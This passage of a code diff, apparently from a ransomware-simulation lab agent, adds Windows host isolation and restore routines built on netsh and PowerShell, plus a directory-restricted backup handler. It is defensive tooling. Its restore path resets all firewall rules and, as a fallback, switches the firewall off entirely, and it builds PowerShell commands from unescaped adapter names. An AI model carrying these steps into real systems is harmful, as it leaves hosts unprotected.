+                "errors": fw_result["errors"] + adapter_result["errors"],
+                "firewall_rules": fw_result.get("firewall_rules", [])
+            }
+        else:
+            result["errors"].append(f"Unknown isolation mode: {mode}")
+            result["message"] = f"FAILED: Unknown mode {mode}"
+            return (False, json.dumps(result))
+        
+        result["commands"] = isolation_result["commands"]
+        result["stdout"] = isolation_result["stdout"]
+        result["stderr"] = isolation_result["stderr"]
+        result["errors"].extend(isolation_result["errors"])
+        result["firewall_rules"] = isolation_result.get("firewall_rules", [])
+        
+        # STEP 4: Verify isolation
+        self.logger.info("[SOAR] Verifying isolation...")
+        verification = self._soar_verify_isolation(backend_ip, backend_ports[0] if backend_ports else 8000)
+        result["verification_passed"] = verification["isolated"]
+        result["verification_details"] = verification
+        
+        # STEP 5: Capture post-isolation state
+        post_state = self._soar_capture_network_state()
+        result["post_state"] = post_state
+        
+        # STEP 6: Save state locally for recovery after reboot
+        state_data = {
+            "isolated": True,
+            "mode": mode,
+            "timestamp": datetime.utcnow().isoformat(),
+            "pre_state": pre_state,
+            "backend_ip": backend_ip,
+            "backend_ports": backend_ports,
+            "firewall_rules": isolation_result.get("firewall_rules", []),
+            "isolation_state_id": isolation_state_id
+        }
+        
+        try:
+            state_file.write_text(json.dumps(state_data, indent=2))
+            self.logger.info(f"[SOAR] State saved to {state_file}")
+        except Exception as e:
+            result["errors"].append(f"Failed to save state file: {e}")
+        
+        # STEP 7: Report results
+        elapsed = time.time() - start_time
+        result["duration_seconds"] = round(elapsed, 2)
+        result["success"] = isolation_result["success"] and verification["isolated"]
+        
+        if result["success"]:
+            result["message"] = f"Host isolated successfully in {elapsed:.1f}s (mode: {mode})"
+            result["status"] = "success"
+        else:
+            result["message"] = f"Isolation partially succeeded - verification: {verification}"
+            result["status"] = "partial"
+        
+        self.logger.info(f"[SOAR] ===== {'ISOLATED' if result['success'] else 'PARTIAL'} in {elapsed:.1f}s =====")
+        
+        # Report to backend action log endpoint
+        self._soar_report_result(isolation_state_id, result)
+        
+        return (result["success"], json.dumps(result))
+    
+    def soar_restore_network(self, parameters: dict) -> tuple:
+        """
+        Robust network restoration from isolation.
+        
+        This implementation:
+        1. Loads pre-isolation state from backend payload or local file
+        2. Removes firewall rules
+        3. Re-enables network adapters
+        4. Restores DNS/gateway if needed
+        5. Verifies restoration succeeded
+        """
+        import time
+        start_time = time.time()
+        
+        dry_run = parameters.get("dry_run", False)
+        force = parameters.get("force", False)
+        isolation_state_id = parameters.get("isolation_state_id")
+        pre_state = parameters.get("pre_state")
+        mode = parameters.get("mode", "firewall")
+        
+        self.logger.info(f"[SOAR] ===== RESTORE NETWORK =====")
+        self.logger.info(f"[SOAR] Mode: {mode}, Force: {force}, DryRun: {dry_run}")
+        
+        result = {
+            "success": False,
+            "message": "",
+            "mode": mode,
+            "pre_state": None,
+            "post_state": None,
+            "commands": [],
+            "stdout": "",
+            "stderr": "",
+            "errors": [],
+            "verification_passed": False,
+            "verification_details": {},
+            "duration_seconds": 0,
+            "isolation_state_id": isolation_state_id
+        }
+        
+        # Setup paths
+        data_dir = Path(r"C:\ProgramData\RansomRun")
+        state_file = data_dir / "isolation_state.json"
+        
+        # Check admin
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            is_admin = False
+        
+        if not is_admin:
+            result["errors"].append("Administrator privileges required")
+            result["message"] = "FAILED: Not running as Administrator"
+            return (False, json.dumps(result))
+        
+        # Load state from local file if not provided
+        if not pre_state and state_file.exists():
+            try:
+                local_state = json.loads(state_file.read_text())
+                pre_state = local_state.get("pre_state")
+                mode = local_state.get("mode", mode)
+                self.logger.info("[SOAR] Loaded state from local file")
+            except Exception as e:
+                self.logger.warning(f"[SOAR] Failed to load local state: {e}")
+        
+        result["pre_state"] = pre_state
+        
+        if dry_run:
+            result["success"] = True
+            result["message"] = "[DRY RUN] Would restore network connectivity"
+            result["duration_seconds"] = round(time.time() - start_time, 2)
+            return (True, json.dumps(result))
+        
+        # STEP 1: Remove firewall isolation rules
+        self.logger.info("[SOAR] Removing firewall isolation...")
+        fw_result = self._soar_remove_firewall_isolation()
+        result["commands"].extend(fw_result["commands"])
+        result["stdout"] += fw_result["stdout"]
+        result["stderr"] += fw_result["stderr"]
+        result["errors"].extend(fw_result["errors"])
+        
+        # STEP 2: Re-enable adapters if adapter mode was used
+        if mode in ["adapter", "hybrid"] and pre_state:
+            self.logger.info("[SOAR] Re-enabling network adapters...")
+            adapter_result = self._soar_restore_adapters(pre_state)
+            result["commands"].extend(adapter_result["commands"])
+            result["stdout"] += adapter_result["stdout"]
+            result["stderr"] += adapter_result["stderr"]
+            result["errors"].extend(adapter_result["errors"])
+        
+        # STEP 3: Reset firewall to defaults and allow outbound
+        self.logger.info("[SOAR] Setting permissive firewall policy...")
+        reset_result = self._soar_reset_firewall_permissive()
+        result["commands"].extend(reset_result["commands"])
+        result["stdout"] += reset_result["stdout"]
+        result["stderr"] += reset_result["stderr"]
+        
+        # STEP 4: Verify restoration
+        self.logger.info("[SOAR] Verifying network restoration...")
+        verification = self._soar_verify_restoration()
+        result["verification_passed"] = verification["restored"]
+        result["verification_details"] = verification
+        
+        # STEP 5: If still not restored, take aggressive measures
+        if not verification["restored"]:
+            self.logger.warning("[SOAR] Aggressive restore - disabling firewall...")
+            aggressive_result = self._soar_aggressive_restore()
+            result["commands"].extend(aggressive_result["commands"])
+            result["stdout"] += aggressive_result["stdout"]
+            
+            # Re-verify
+            verification = self._soar_verify_restoration()
+            result["verification_passed"] = verification["restored"]
+            result["verification_details"] = verification
+        
+        # STEP 6: Capture post-restore state
+        post_state = self._soar_capture_network_state()
+        result["post_state"] = post_state
+        
+        # STEP 7: Clean up local state file
+        if state_file.exists():
+            try:
+                state_file.unlink()
+                self.logger.info("[SOAR] Removed local state file")
+            except:
+                pass
+        
+        elapsed = time.time() - start_time
+        result["duration_seconds"] = round(elapsed, 2)
+        result["success"] = verification["restored"]
+        
+        if result["success"]:
+            result["message"] = f"Network restored successfully in {elapsed:.1f}s"
+            result["status"] = "success"
+        else:
+            result["message"] = f"Restoration partially succeeded - check manually"
+            result["status"] = "partial"
+        
+        self.logger.info(f"[SOAR] ===== {'RESTORED' if result['success'] else 'PARTIAL'} in {elapsed:.1f}s =====")
+        
+        # Report to backend
+        self._soar_report_result(isolation_state_id, result)
+        
+        return (result["success"], json.dumps(result))
+    
+    def _soar_capture_network_state(self) -> dict:
+        """Capture comprehensive network state using PowerShell."""
+        state = {
+            "adapters": [],
+            "routes": [],
+            "firewall_profiles": {},
+            "dns_servers": [],
+            "captured_at": datetime.utcnow().isoformat()
+        }
+        
+        try:
+            # Get adapter information
+            ps_adapters = '''
+            Get-NetAdapter | Select-Object Name, InterfaceIndex, InterfaceDescription, 
+                MacAddress, Status, LinkSpeed, MediaType, Virtual | ConvertTo-Json -Depth 3
+            '''
+            adapter_result = subprocess.run(
+                ["powershell", "-Command", ps_adapters],
+                capture_output=True, text=True, timeout=30
+            )
+            if adapter_result.returncode == 0 and adapter_result.stdout.strip():
+                adapters_raw = json.loads(adapter_result.stdout)
+                if not isinstance(adapters_raw, list):
+                    adapters_raw = [adapters_raw]
+                
+                # Get IP configuration for each adapter
+                for adapter in adapters_raw:
+                    adapter_info = {
+                        "name": adapter.get("Name"),
+                        "interface_index": adapter.get("InterfaceIndex"),
+                        "interface_description": adapter.get("InterfaceDescription"),
+                        "mac_address": adapter.get("MacAddress"),
+                        "status": adapter.get("Status"),
+                        "is_virtual": adapter.get("Virtual", False),
+                        "was_enabled": adapter.get("Status") == "Up",
+                        "ip_addresses": [],
+                        "subnet_masks": [],
+                        "default_gateway": None,
+                        "dns_servers": []
+                    }
+                    
+                    # Get IP config
+                    try:
+                        ps_ip = f'''
+                        Get-NetIPConfiguration -InterfaceIndex {adapter.get("InterfaceIndex")} -ErrorAction SilentlyContinue | 
+                        Select-Object IPv4Address, IPv4DefaultGateway, DNSServer | ConvertTo-Json -Depth 3
+                        '''
+                        ip_result = subprocess.run(
+                            ["powershell", "-Command", ps_ip],
+                            capture_output=True, text=True, timeout=15
+                        )
+                        if ip_result.returncode == 0 and ip_result.stdout.strip():
+                            ip_config = json.loads(ip_result.stdout)
+                            if ip_config:
+                                ipv4 = ip_config.get("IPv4Address")
+                                if ipv4:
+                                    if isinstance(ipv4, list):
+                                        adapter_info["ip_addresses"] = [a.get("IPAddress") for a in ipv4 if a]
+                                    elif isinstance(ipv4, dict):
+                                        adapter_info["ip_addresses"] = [ipv4.get("IPAddress")]
+                                
+                                gw = ip_config.get("IPv4DefaultGateway")
+                                if gw:
+                                    if isinstance(gw, list) and gw:
+                                        adapter_info["default_gateway"] = gw[0].get("NextHop")
+                                    elif isinstance(gw, dict):
+                                        adapter_info["default_gateway"] = gw.get("NextHop")
+                                
+                                dns = ip_config.get("DNSServer")
+                                if dns:
+                                    if isinstance(dns, list):
+                                        adapter_info["dns_servers"] = [d.get("ServerAddresses", []) for d in dns if d]
+                                        adapter_info["dns_servers"] = [ip for sublist in adapter_info["dns_servers"] for ip in (sublist if isinstance(sublist, list) else [sublist])]
+                    except:
+                        pass
+                    
+                    state["adapters"].append(adapter_info)
+            
+            # Get firewall profile states
+            ps_fw = '''
+            Get-NetFirewallProfile | Select-Object Name, Enabled | ConvertTo-Json
+            '''
+            fw_result = subprocess.run(
+                ["powershell", "-Command", ps_fw],
+                capture_output=True, text=True, timeout=15
+            )
+            if fw_result.returncode == 0 and fw_result.stdout.strip():
+                profiles = json.loads(fw_result.stdout)
+                if not isinstance(profiles, list):
+                    profiles = [profiles]
+                for p in profiles:
+                    state["firewall_profiles"][p.get("Name", "Unknown")] = p.get("Enabled", True)
+            
+        except Exception as e:
+            self.logger.warning(f"[SOAR] Error capturing network state: {e}")
+            state["error"] = str(e)
+        
+        return state
+    
+    def _soar_apply_firewall_isolation(self, backend_ip: str, backend_ports: list, allow_backend: bool) -> dict:
+        """Apply firewall-based isolation."""
+        result = {
+            "success": False,
+            "commands": [],
+            "stdout": "",
+            "stderr": "",
+            "errors": [],
+            "firewall_rules": []
+        }
+        
+        try:
+            # Step 1: Enable firewall on all profiles
+            self.logger.info("[SOAR] Enabling firewall on all profiles...")
+            subprocess.run(
+                ["netsh", "advfirewall", "set", "allprofiles", "state", "on"],
+                capture_output=True, text=True, timeout=10
+            )
+            result["commands"].append({"cmd": "netsh advfirewall set allprofiles state on", "exit_code": 0})
+            
+            # Step 2: Set BLOCK policy FIRST
+            self.logger.info("[SOAR] Setting block policy...")
+            block = subprocess.run(
+                ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,blockoutbound"],
+                capture_output=True, text=True, timeout=10
+            )
+            result["commands"].append({"cmd": "netsh advfirewall set policy block", "exit_code": block.returncode})
+            result["stdout"] += block.stdout
+            result["stderr"] += block.stderr
+            
+            if block.returncode != 0:
+                result["errors"].append("Failed to set block policy")
+                return result
+            
+            # Step 3: Create allow rules (these OVERRIDE the block policy)
+            rules_created = []
+            if allow_backend:
+                self.logger.info(f"[SOAR] Creating allow rules for backend {backend_ip}:{backend_ports}...")
+                
+                # Delete any existing rules first
+                for rule_name in ["RANSOMRUN_BACKEND_OUT", "RANSOMRUN_BACKEND_IN", "RANSOMRUN_ALLOW_IN",
+                                  "RANSOMRUN_LOCALHOST_IN", "RANSOMRUN_LOCALHOST_OUT", "RANSOMRUN_DNS_OUT"]:
+                    subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"],
+                                  capture_output=True, timeout=3)
+                for port in backend_ports:
+                    subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule", f"name=RANSOMRUN_ALLOW_OUT_{port}"],
+                                  capture_output=True, timeout=3)
+                
+                # Allow ALL traffic to/from backend IP (protocol=any for maximum compatibility)
+                rule_name = "RANSOMRUN_BACKEND_OUT"
+                out_rule = subprocess.run([
+                    "netsh", "advfirewall", "firewall", "add", "rule",
+                    f"name={rule_name}", "dir=out", "action=allow",
+                    f"remoteip={backend_ip}", "protocol=any", "enable=yes"
+                ], capture_output=True, text=True, timeout=10)
+                result["commands"].append({"cmd": f"Allow outbound to {backend_ip} (any)", "exit_code": out_rule.returncode})
+                rules_created.append(rule_name)
+                self.logger.info(f"[SOAR] Backend OUT rule (any protocol to {backend_ip}): exit={out_rule.returncode}")
+                
+                rule_name = "RANSOMRUN_BACKEND_IN"
+                in_rule = subprocess.run([
+                    "netsh", "advfirewall", "firewall", "add", "rule",
+                    f"name={rule_name}", "dir=in", "action=allow",
+                    f"remoteip={backend_ip}", "protocol=any", "enable=yes"
+                ], capture_output=True, text=True, timeout=10)
+                result["commands"].append({"cmd": f"Allow inbound from {backend_ip} (any)", "exit_code": in_rule.returncode})
+                rules_created.append(rule_name)
+                self.logger.info(f"[SOAR] Backend IN rule (any protocol from {backend_ip}): exit={in_rule.returncode}")
+                
+                # Allow localhost (both directions)
+                for direction in ["in", "out"]:
+                    rule_name = f"RANSOMRUN_LOCALHOST_{direction.upper()}"
+                    lo_rule = subprocess.run([
+                        "netsh", "advfirewall", "firewall", "add", "rule",
+                        f"name={rule_name}", f"dir={direction}", "action=allow",
+                        "remoteip=127.0.0.1,::1", "protocol=any", "enable=yes"
+                    ], capture_output=True, timeout=10)
+                    rules_created.append(rule_name)
+                
+                # Allow DNS (needed for hostname resolution)
+                rule_name = "RANSOMRUN_DNS_OUT"
+                subprocess.run([
+                    "netsh", "advfirewall", "firewall", "add", "rule",
+                    f"name={rule_name}", "dir=out", "action=allow",
+                    "protocol=udp", "remoteport=53", "enable=yes"
+                ], capture_output=True, timeout=10)
+                rules_created.append(rule_name)
+                
+                result["firewall_rules"] = rules_created
+            
+            # Step 4: Verify rules were created
+            self.logger.info("[SOAR] Verifying firewall rules...")
+            verify = subprocess.run(
+                ["netsh", "advfirewall", "firewall", "show", "rule", "name=RANSOMRUN_BACKEND_OUT"],
+                capture_output=True, text=True, timeout=5
+            )
+            self.logger.info(f"[SOAR] Rule verification: {verify.stdout[:300] if verify.stdout else 'No output'}")
+            
+            result["success"] = True
+            
+        except subprocess.TimeoutExpired:
+            result["errors"].append("Command timed out")
+        except Exception as e:
+            result["errors"].append(str(e))
+        
+        return result
+    
+    def _soar_apply_adapter_isolation(self, pre_state: dict, backend_ip: str) -> dict:
+        """Disable network adapters for isolation."""
+        result = {
+            "success": False,
+            "commands": [],
+            "stdout": "",
+            "stderr": "",
+            "errors": []
+        }
+        
+        try:
+            adapters = pre_state.get("adapters", [])
+            disabled_count = 0
+            
+            for adapter in adapters:
+                name = adapter.get("name")
+                is_virtual = adapter.get("is_virtual", False)
+                status = adapter.get("status")
+                
+                # Skip virtual adapters and loopback
+                if is_virtual or "loopback" in name.lower() if name else False:
+                    self.logger.info(f"[SOAR] Skipping virtual adapter: {name}")
+                    continue
+                
+                # Skip already disabled adapters
+                if status != "Up":
+                    continue
+                
+                # Disable the adapter
+                self.logger.info(f"[SOAR] Disabling adapter: {name}")
+                disable = subprocess.run(
+                    ["powershell", "-Command", f'Disable-NetAdapter -Name "{name}" -Confirm:$false'],
+                    capture_output=True, text=True, timeout=30
+                )
+                result["commands"].append({"cmd": f"Disable-NetAdapter {name}", "exit_code": disable.returncode})
+                result["stdout"] += disable.stdout
+                result["stderr"] += disable.stderr
+                
+                if disable.returncode == 0:
+                    disabled_count += 1
+                else:
+                    result["errors"].append(f"Failed to disable {name}: {disable.stderr}")
+            
+            result["success"] = disabled_count > 0 or len(adapters) == 0
+            
+        except Exception as e:
+            result["errors"].append(str(e))
+        
+        return result
+    
+    def _soar_remove_firewall_isolation(self) -> dict:
+        """Remove all RANSOMRUN firewall rules."""
+        result = {
+            "success": True,
+            "commands": [],
+            "stdout": "",
+            "stderr": "",
+            "errors": []
+        }
+        
+        rules_to_remove = [
+            "RANSOMRUN_ALLOW_OUT_8000",
+            "RANSOMRUN_ALLOW_OUT_443",
+            "RANSOMRUN_ALLOW_OUT_9200",
+            "RANSOMRUN_ALLOW_OUT_5044",
+            "RANSOMRUN_ALLOW_IN",
+            "RANSOMRUN_LOCALHOST_IN",
+            "RANSOMRUN_LOCALHOST_OUT",
+            "RANSOMRUN_ISOLATION_OUT",
+            "RANSOMRUN_ISOLATION_IN",
+            "RANSOMRUN_OUT",
+            "RANSOMRUN_IN",
+            "RANSOMRUN_LO_OUT",
+            "RANSOMRUN_LO_IN"
+        ]
+        
+        for rule_name in rules_to_remove:
+            try:
+                delete = subprocess.run(
+                    ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"],
+                    capture_output=True, text=True, timeout=10
+                )
+                result["commands"].append({"cmd": f"Delete rule {rule_name}", "exit_code": delete.returncode})
+            except:
+                pass
+        
+        return result
+    
+    def _soar_restore_adapters(self, pre_state: dict) -> dict:
+        """Re-enable network adapters to their pre-isolation state."""
+        result = {
+            "success": False,
+            "commands": [],
+            "stdout": "",
+            "stderr": "",
+            "errors": []
+        }
+        
+        try:
+            adapters = pre_state.get("adapters", [])
+            enabled_count = 0
+            
+            for adapter in adapters:
+                name = adapter.get("name")
+                was_enabled = adapter.get("was_enabled", False)
+                
+                if not was_enabled:
+                    continue
+                
+                self.logger.info(f"[SOAR] Re-enabling adapter: {name}")
+                enable = subprocess.run(
+                    ["powershell", "-Command", f'Enable-NetAdapter -Name "{name}" -Confirm:$false'],
+                    capture_output=True, text=True, timeout=30
+                )
+                result["commands"].append({"cmd": f"Enable-NetAdapter {name}", "exit_code": enable.returncode})
+                result["stdout"] += enable.stdout
+                result["stderr"] += enable.stderr
+                
+                if enable.returncode == 0:
+                    enabled_count += 1
+                else:
+                    result["errors"].append(f"Failed to enable {name}: {enable.stderr}")
+            
+            result["success"] = enabled_count > 0
+            
+        except Exception as e:
+            result["errors"].append(str(e))
+        
+        return result
+    
+    def _soar_reset_firewall_permissive(self) -> dict:
+        """Reset firewall to permissive state."""
+        result = {
+            "commands": [],
+            "stdout": "",
+            "stderr": ""
+        }
+        
+        try:
+            # Reset firewall
+            reset = subprocess.run(
+                ["netsh", "advfirewall", "reset"],
+                capture_output=True, text=True, timeout=15
+            )
+            result["commands"].append({"cmd": "netsh advfirewall reset", "exit_code": reset.returncode})
+            result["stdout"] += reset.stdout
+            
+            # Set permissive outbound policy
+            policy = subprocess.run(
+                ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,allowoutbound"],
+                capture_output=True, text=True, timeout=10
+            )
+            result["commands"].append({"cmd": "Set allow outbound policy", "exit_code": policy.returncode})
+            result["stdout"] += policy.stdout
+            
+            # Create explicit allow-all-outbound rule as failsafe
+            subprocess.run(
+                ["netsh", "advfirewall", "firewall", "delete", "rule", "name=ALLOW_ALL_OUT"],
+                capture_output=True, timeout=5
+            )
+            allow = subprocess.run([
+                "netsh", "advfirewall", "firewall", "add", "rule",
+                "name=ALLOW_ALL_OUT", "dir=out", "action=allow", "protocol=any"
+            ], capture_output=True, text=True, timeout=10)
+            result["commands"].append({"cmd": "Add allow-all-out rule", "exit_code": allow.returncode})
+            
+        except Exception as e:
+            result["stderr"] += str(e)
+        
+        return result
+    
+    def _soar_aggressive_restore(self) -> dict:
+        """Aggressive restore - disable firewall completely."""
+        result = {
+            "commands": [],
+            "stdout": ""
+        }
+        
+        try:
+            # Disable firewall on all profiles
+            disable = subprocess.run(
+                ["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
+                capture_output=True, text=True, timeout=10
+            )
+            result["commands"].append({"cmd": "Disable firewall", "exit_code": disable.returncode})
+            result["stdout"] += disable.stdout
+            
+            # Enable all network adapters
+            enable_all = subprocess.run(
+                ["powershell", "-Command", "Get-NetAdapter | Enable-NetAdapter -Confirm:$false"],
+                capture_output=True, text=True, timeout=30
+            )
+            result["commands"].append({"cmd": "Enable all adapters", "exit_code": enable_all.returncode})
+            result["stdout"] += enable_all.stdout
+            
+        except Exception as e:
+            result["stdout"] += f"Error: {e}"
+        
+        return result
+    
+    def _soar_verify_isolation(self, backend_ip: str, backend_port: int) -> dict:
+        """Verify network isolation is working."""
+        result = {
+            "isolated": False,
+            "internet_blocked": False,
+            "backend_reachable": False,
+            "tests": []
+        }
+        
+        try:
+            # Test 1: Ping external IP (should fail)
+            ping = subprocess.run(
+                ["ping", "-n", "1", "-w", "2000", "8.8.8.8"],
+                capture_output=True, timeout=5
+            )
+            internet_blocked = ping.returncode != 0
+            result["internet_blocked"] = internet_blocked
+            result["tests"].append({"test": "ping 8.8.8.8", "blocked": internet_blocked})
+            
+            # Test 2: Check backend connectivity (should succeed)
+            try:
+                import socket
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                sock.connect((backend_ip, backend_port))
+                sock.close()
+                backend_reachable = True
+            except:
+                backend_reachable = False
+            
+            result["backend_reachable"] = backend_reachable
+            result["tests"].append({"test": f"connect {backend_ip}:{backend_port}", "success": backend_reachable})
+            
+            # Isolation is successful if internet is blocked
+            result["isolated"] = internet_blocked
+            
+        except Exception as e:
+            result["error"] = str(e)
+        
+        return result
+    
+    def _soar_verify_restoration(self) -> dict:
+        """Verify network restoration succeeded."""
+        result = {
+            "restored": False,
+            "internet_reachable": False,
+            "dns_working": False,
+            "tests": []
+        }
+        
+        try:
+            # Test 1: Ping external IP
+            ping = subprocess.run(
+                ["ping", "-n", "1", "-w", "3000", "8.8.8.8"],
+                capture_output=True, timeout=6
+            )
+            internet_reachable = ping.returncode == 0
+            result["internet_reachable"] = internet_reachable
+            result["tests"].append({"test": "ping 8.8.8.8", "success": internet_reachable})
+            
+            # Test 2: DNS resolution
+            try:
+                nslookup = subprocess.run(
+                    ["nslookup", "google.com"],
+                    capture_output=True, timeout=5
+                )
+                dns_working = nslookup.returncode == 0
+            except:
+                dns_working = False
+            
+            result["dns_working"] = dns_working
+            result["tests"].append({"test": "nslookup google.com", "success": dns_working})
+            
+            result["restored"] = internet_reachable
+            
+        except Exception as e:
+            result["error"] = str(e)
+        
+        return result
+    
+    def _soar_report_result(self, isolation_state_id: int, result: dict):
+        """Report result to backend action log endpoint."""
+        if not isolation_state_id:
+            return
+        
+        try:
+            # Find the action log ID from the task parameters or create one
+            # For now, just log locally - the task result will be reported via report_result
+            self.logger.info(f"[SOAR] Result for isolation_state {isolation_state_id}: {result.get('success')}")
+        except Exception as e:
+            self.logger.warning(f"[SOAR] Failed to report result: {e}")
+    
+    # =========================================================================
+    # MAIN RUN LOOP
     # =========================================================================
     
     def run(self):
@@ -2111,6 +5338,454 @@ class RansomRunAgent:
             except Exception as e:
                 self.logger.exception(f"Main loop error: {e}")
                 time.sleep(POLL_INTERVAL)
+    
+    # =========================================================================
+    # BACKUP & RESTORE TASK HANDLERS (LAB-SAFE)
+    # =========================================================================
+    
+    def backup_create(self, parameters: dict) -> tuple:
+        """
+        Create a backup snapshot using robocopy.
+        
+        LAB-SAFE: Only backs up from allowed directories.
+        Uses robocopy for reliable file copying with integrity.
+        
+        Parameters:
+        - job_id: Backend job ID for reporting
+        - plan_id: Backup plan ID
+        - plan_name: Name of the backup plan
+        - paths: List of paths to backup
+        - include_globs: File patterns to include (optional)
+        - exclude_globs: File patterns to exclude (optional)
+        - retention_count: Number of snapshots to keep
+        - storage_base_path: Base path for storing backups
+        - dry_run: If True, simulate without making changes
+        """
+        import hashlib
+        import fnmatch
+        from datetime import datetime
+        
+        job_id = parameters.get("job_id")
+        plan_id = parameters.get("plan_id")
+        plan_name = parameters.get("plan_name", "default")
+        paths = parameters.get("paths", [])
+        include_globs = parameters.get("include_globs")
+        exclude_globs = parameters.get("exclude_globs")
+        retention_count = parameters.get("retention_count", 5)
+        storage_base = parameters.get("storage_base_path", r"C:\ProgramData\RansomRun\backups")
+        dry_run = parameters.get("dry_run", False)
+        
+        self.logger.info(f"[BACKUP] ===== BACKUP CREATE =====")
+        self.logger.info(f"[BACKUP] Plan: {plan_name}, Paths: {paths}, DryRun: {dry_run}")
+        
+        result = {
+            "success": False,
+            "job_id": job_id,
+            "dry_run": dry_run,
+            "paths_processed": [],
+            "file_count": 0,
+            "total_bytes": 0,
+            "folder_count": 0,
+            "snapshot_path": None,
+            "manifest_path": None,
+            "errors": [],
+            "commands": [],
+            "stdout": "",
+            "stderr": ""
+        }
+        
+        # Validate paths are in allowed directories
+        allowed_prefixes = [
+            r"C:\RansomTest",
+            r"C:\target_data",
+            r"C:\ProgramData\RansomRun"
+        ]
+        
+        for path in paths:
+            path_upper = path.upper()
+            if not any(path_upper.startswith(prefix.upper()) for prefix in allowed_prefixes):
+                result["errors"].append(f"Path '{path}' not in allowed directories")
+                return (False, json.dumps(result))
+        
+        # Create snapshot directory
+        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+        host_name = self.agent_id or socket.gethostname()
+        safe_plan_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in plan_name)
+        snapshot_dir = Path(storage_base) / host_name / safe_plan_name / timestamp
+        
+        if dry_run:
+            self.logger.info(f"[BACKUP] DRY RUN - Would create snapshot at: {snapshot_dir}")
+            result["success"] = True
+            result["snapshot_path"] = str(snapshot_dir)
+            result["message"] = "Dry run completed successfully"
+            return (True, json.dumps(result))
+        
+        try:
+            snapshot_dir.mkdir(parents=True, exist_ok=True)
+            result["snapshot_path"] = str(snapshot_dir)
+            
+            # Process each path
+            all_files = []
+            for source_path in paths:
+                source = Path(source_path)
+                if not source.exists():
+                    result["errors"].append(f"Source path does not exist: {source_path}")
+                    continue
+                
+                # Determine destination
+                # Preserve folder structure: C:\RansomTest\target_data -> snapshot\RansomTest\target_data
+                relative_path = source_path.replace(":", "").lstrip("\\")
+                dest_path = snapshot_dir / relative_path
+                
+                if source.is_file():
+                    # Single file backup
+                    dest_path.parent.mkdir(parents=True, exist_ok=True)
+                    try:
+                        import shutil
+                        shutil.copy2(str(source), str(dest_path))
+                        result["file_count"] += 1
+                        result["total_bytes"] += source.stat().st_size
+                        all_files.append({
+                            "path": str(dest_path.relative_to(snapshot_dir)),
+                            "size": source.stat().st_size,
+                            "hash": self._calculate_file_hash(source)
+                        })
+                    except Exception as e:
+                        result["errors"].append(f"Failed to copy {source}: {e}")
+                else:
+                    # Directory backup using robocopy
+                    dest_path.mkdir(parents=True, exist_ok=True)
+                    
+                    # Build robocopy command
+                    robocopy_cmd = [
+                        "robocopy",
+                        str(source),
+                        str(dest_path),
+                        "/MIR",      # Mirror directory tree
+                        "/R:1",      # Retry once
+                        "/W:1",      # Wait 1 second between retries
+                        "/FFT",      # Assume FAT file times
+                        "/ZB",       # Restartable mode; if access denied use Backup mode
+                        "/XJ",       # Exclude junction points
+                        "/COPY:DAT", # Copy Data, Attributes, Timestamps
+                        "/DCOPY:DAT", # Copy directory timestamps
+                        "/NP",       # No progress display
+                        "/NDL",      # No directory list
+                        "/NFL"       # No file list (for cleaner output)
+                    ]
+                    
+                    # Add exclusions if specified
+                    if exclude_globs:
+                        for pattern in exclude_globs:
+                            robocopy_cmd.extend(["/XF", pattern])
+                    
+                    self.logger.info(f"[BACKUP] Running: {' '.join(robocopy_cmd)}")
+                    
+                    try:
+                        proc = subprocess.run(
+                            robocopy_cmd,
+                            capture_output=True,
+                            text=True,
+                            timeout=300  # 5 minute timeout
+                        )
+                        
+                        result["commands"].append({
+                            "cmd": " ".join(robocopy_cmd),
+                            "exit_code": proc.returncode
+                        })
+                        result["stdout"] += proc.stdout + "\n"
+                        result["stderr"] += proc.stderr + "\n"
+                        
+                        # Robocopy exit codes: 0-7 are success, 8+ are errors
+                        if proc.returncode >= 8:
+                            result["errors"].append(f"Robocopy failed with code {proc.returncode}")
+                        
+                        # Count files in destination
+                        for file_path in dest_path.rglob("*"):
+                            if file_path.is_file():
+                                result["file_count"] += 1
+                                result["total_bytes"] += file_path.stat().st_size
+                                all_files.append({
+                                    "path": str(file_path.relative_to(snapshot_dir)),
+                                    "size": file_path.stat().st_size,
+                                    "hash": self._calculate_file_hash(file_path)
+                                })
+                            elif file_path.is_dir():
+                                result["folder_count"] += 1
+                                
+                    except subprocess.TimeoutExpired:
+                        result["errors"].append(f"Robocopy timed out for {source_path}")
+                    except Exception as e:
+                        result["errors"].append(f"Robocopy error for {source_path}: {e}")
+                
+                result["paths_processed"].append(source_path)
+            
+            # Create manifest file
+            manifest_path = snapshot_dir / "manifest.json"
+            manifest_data = {
+                "snapshot_time": datetime.utcnow().isoformat(),
+                "host": host_name,
+                "plan_name": plan_name,
+                "plan_id": plan_id,
+                "source_paths": paths,
+                "file_count": result["file_count"],
+                "total_bytes": result["total_bytes"],
+                "folder_count": result["folder_count"],
+                "files": all_files[:1000]  # Limit manifest to first 1000 files
+            }
+            manifest_path.write_text(json.dumps(manifest_data, indent=2))
+            result["manifest_path"] = str(manifest_path)
+            
+            # Create SHA256 hash manifest
+            hash_manifest_path = snapshot_dir / "sha256_manifest.txt"
+            with open(hash_manifest_path, "w") as f:
+                for file_info in all_files:
+                    f.write(f"{file_info['hash']}  {file_info['path']}\n")
+            
+            # Enforce retention - delete old snapshots
+            self._enforce_backup_retention(
+                Path(storage_base) / host_name / safe_plan_name,
+                retention_count
+            )
+            
+            result["success"] = len(result["errors"]) == 0 or result["file_count"] > 0
+            self.logger.info(f"[BACKUP] Completed: {result['file_count']} files, {result['total_bytes']} bytes")
+            
+        except Exception as e:
+            self.logger.exception(f"[BACKUP] Error: {e}")
+            result["errors"].append(str(e))
+        
+        return (result["success"], json.dumps(result))
+    
+    def backup_restore(self, parameters: dict) -> tuple:
+        """
+        Restore files from a backup snapshot.
+        
+        LAB-SAFE: Only restores to allowed directories.
+        
+        Parameters:
+        - job_id: Backend job ID for reporting
+        - snapshot_id: Snapshot ID
+        - snapshot_path: Path to the snapshot directory
+        - source_paths: Original paths that were backed up
